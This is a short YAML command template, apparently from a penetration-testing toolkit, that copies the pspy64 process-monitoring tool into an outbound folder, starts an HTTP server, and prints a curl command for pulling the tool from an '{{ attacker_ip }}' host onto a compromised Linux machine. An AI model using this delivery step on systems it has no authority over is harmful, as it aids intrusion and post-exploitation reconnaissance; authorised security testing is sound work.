metadata:
  filename: "deliver-linux-pspy.yaml"
  tags: ["system", "linux"]
  created: "2025-03-29"
  author: "Unknown"

content: |
  mkdir -p packstation/outbound; cp -n {{ tools_dir }}/pspy/pspy64 packstation/outbound/; \
  echo '================================================================'; \
  echo '                       -----Linux------                         '; \
  echo 'Deliver: curl http://{{ attacker_ip }}:{{ delivery_outbound_port }}/pspy64 -o {{ delivery_path_linux }}/pspy64'; \
  echo '================================================================'; \
  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound
